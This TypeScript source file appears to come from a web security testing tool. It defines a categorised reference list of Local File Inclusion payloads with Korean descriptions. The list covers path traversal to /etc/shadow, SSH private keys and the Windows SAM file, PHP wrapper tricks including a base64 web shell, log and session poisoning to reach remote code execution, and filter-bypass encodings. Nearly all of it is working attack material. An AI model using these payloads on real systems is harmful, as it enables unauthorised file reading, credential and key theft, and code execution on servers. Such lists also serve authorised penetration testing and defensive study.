// Reference-only, like sqlPayloads.ts: nothing here sends a request or picks
// a payload automatically. Paste into the request editor, or send a whole
// category to Intruder as a candidate list for the marked position.
export type LfiPayload = { label: string; payload: string; note?: string };
export type LfiPayloadCategory = {
  id: string;
  title: string;
  targets: string[];
  description: string;
  payloads: LfiPayload[];
};

const traversalDepths = (suffix: string, maxDepth = 10) =>
  Array.from({ length: maxDepth }, (_, index) => "../".repeat(index + 1) + suffix);

export const lfiPayloadCategories: LfiPayloadCategory[] = [
  {
    id: "traversal-depth",
    title: "경로 깊이 탐색",
    targets: ["generic"],
    description: "웹 루트에서 목표 파일까지 몇 단계 올라가야 하는지 모를 때, 깊이를 1~10단계까지 " +
      "한 번에 대입해 응답 크기가 바뀌는 지점을 찾습니다. 그 뒤 targets 카테고리의 파일명으로 교체하세요.",
    payloads: traversalDepths("etc/passwd").map((payload, index) => ({
      label: `${index + 1}단계`, payload,
    })),
  },
  {
    id: "linux-targets",
    title: "Linux 대상 파일",
    targets: ["linux"],
    description: "읽었을 때 존재·읽기권한을 바로 확인할 수 있는 표준 파일들입니다. " +
      "../ 개수는 traversal-depth로 먼저 맞추세요.",
    payloads: [
      { label: "계정 목록", payload: "../../../../../../../../etc/passwd" },
      { label: "쉐도우 (root만 읽기 가능, 실패해도 시도할 가치 있음)",
        payload: "../../../../../../../../etc/shadow" },
      { label: "호스트명", payload: "../../../../../../../../etc/hostname" },
      { label: "hosts 파일", payload: "../../../../../../../../etc/hosts" },
      { label: "현재 프로세스 환경변수 (Apache mod_cgi)",
        payload: "../../../../../../../../proc/self/environ",
        note: "환경변수에 User-Agent 등을 삽입해두면 LFI-to-RCE로 이어질 수 있습니다." },
      { label: "현재 프로세스 cmdline", payload: "../../../../../../../../proc/self/cmdline" },
      { label: "SSH 개인키 (접근 가능한 계정이 있을 때)",
        payload: "../../../../../../../../root/.ssh/id_rsa" },
      { label: "crontab", payload: "../../../../../../../../etc/crontab" },
      { label: "Apache 설정", payload: "../../../../../../../../etc/apache2/apache2.conf" },
      { label: "PHP 설정 (disable_functions 확인용)",
        payload: "../../../../../../../../etc/php/*/apache2/php.ini" },
    ],
  },
  {
    id: "windows-targets",
    title: "Windows 대상 파일",
    targets: ["windows"],
    description: "Windows 웹 루트 기준 상대 경로와 드라이브 절대 경로 두 가지를 모두 시도하세요.",
    payloads: [
      { label: "hosts 파일 (상대 경로)",
        payload: "../../../../../../Windows/System32/drivers/etc/hosts" },
      { label: "hosts 파일 (절대 경로)",
        payload: "C:\\Windows\\System32\\drivers\\etc\\hosts" },
      { label: "SAM (읽기 권한 필요, 보통 실패)",
        payload: "../../../../../../Windows/System32/config/SAM" },
      { label: "win.ini (존재만 확인할 때 표준 타깃)",
        payload: "../../../../../../Windows/win.ini" },
      { label: "IIS 설정", payload: "C:\\inetpub\\wwwroot\\web.config" },
      { label: "RDP 히스토리 (사용자 이름 유출용)",
        payload: "../../../../../../Users/Administrator/AppData/Local/Microsoft/" +
          "Terminal Server Client/Cache" },
    ],
  },
  {
    id: "php-wrappers",
    title: "PHP 래퍼",
    targets: ["php"],
    description: "include()/require()가 실제로 실행 가능한 PHP 파일도 그대로 렌더링해버려서 " +
      "소스를 못 읽는 경우, php://filter로 base64 인코딩해 우회합니다. allow_url_include가 " +
      "켜져 있으면 RCE로도 이어집니다.",
    payloads: [
      { label: "소스 base64 추출 (index)",
        payload: "php://filter/convert.base64-encode/resource=index" },
      { label: "소스 base64 추출 (config, 자격증명 후보)",
        payload: "php://filter/convert.base64-encode/resource=config" },
      { label: "read= 명시형 (신버전 PHP 문법)",
        payload: "php://filter/read=convert.base64-encode/resource=index.php" },
      { label: "표준입력에서 코드 실행 (POST body 필요)",
        payload: "php://input",
        note: "요청 Body에 <?php system($_GET['c']); ?> 등을 넣고 page=php://input으로 include시켜야 동작." },
      { label: "data:// 코드 실행", payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
        note: "base64는 <?php system($_GET['c']); ?>. allow_url_include=On 필요." },
      { label: "ZIP 아카이브 내 파일 실행 (업로드 기능과 결합)",
        payload: "zip://uploads/shell.jpg%23payload.php",
        note: "먼저 payload.php를 담은 zip을 이미지로 위장해 업로드해야 합니다." },
      { label: "PHAR 역직렬화 체인 진입점",
        payload: "phar://uploads/shell.jpg/payload.php",
        note: "phar 아카이브를 업로드할 수 있을 때, 역직렬화 가젯 체인과 결합해 사용합니다." },
    ],
  },
  {
    id: "log-poisoning",
    title: "로그 포이즈닝 (LFI → RCE)",
    targets: ["linux"],
    description: "로그 파일에 PHP 코드를 주입한 뒤(User-Agent, SSH 로그인 시도 등) LFI로 그 로그를 " +
      "include시켜 실행합니다. 먼저 아래 파일이 존재·읽기 가능한지 확인하세요.",
    payloads: [
      { label: "Apache access.log (Debian/Ubuntu)",
        payload: "../../../../../../../../var/log/apache2/access.log" },
      { label: "Apache access.log (RHEL/CentOS)",
        payload: "../../../../../../../../var/log/httpd/access_log" },
      { label: "Nginx access.log", payload: "../../../../../../../../var/log/nginx/access.log" },
      { label: "SSH auth.log (사용자명에 코드 주입)",
        payload: "../../../../../../../../var/log/auth.log",
        note: "ssh '<?php system($_GET[\"c\"]); ?>'@target 처럼 사용자명 필드에 페이로드를 실어 로그인 시도." },
      { label: "메일 로그 (SMTP로 코드 주입)",
        payload: "../../../../../../../../var/log/mail.log" },
      { label: "PHP-FPM/FastCGI 세션 파일",
        payload: "../../../../../../../../var/lib/php/sessions/sess_[PHPSESSID]",
        note: "쿠키 값에 코드를 주입한 뒤 세션 파일 경로를 include. PHPSESSID를 실제 값으로 바꾸세요." },
    ],
  },
  {
    id: "filter-bypass",
    title: "필터·검증 우회",
    targets: ["generic"],
    description: "page 파라미터에 확장자 강제(.php 접미사)나 문자열 블랙리스트가 걸려 있을 때 시도할 변형입니다.",
    payloads: [
      { label: "Null byte (PHP < 5.3.4 전용, 구식이지만 시도 가치 있음)",
        payload: "../../../../etc/passwd%00" },
      { label: "경로 truncation (PHP < 5.3, magic_quotes 우회용 장문 패딩)",
        payload: "../../../../etc/passwd" + "/.".repeat(2048) },
      { label: "이중 URL 인코딩", payload: "%252e%252e%252fetc%252fpasswd" },
      { label: "슬래시 없이 상위 폴더 인식시키기 (일부 필터 우회)",
        payload: "....//....//....//....//etc/passwd",
        note: "'../'를 제거하는 단순 필터가 앞뒤를 붙여 다시 '../'를 만들어내는 경우 통합니다." },
      { label: "UTF-8 오버롱 인코딩", payload: "..%c0%af..%c0%af..%c0%afetc/passwd" },
      { label: "허용 접두사 뒤에 상대경로 삽입 (예: /images/ 강제)",
        payload: "....//....//....//etc/passwd" },
    ],
  },
];

export const findLfiPayloadCategory = (id: string) =>
  lfiPayloadCategories.find((category) => category.id === id);
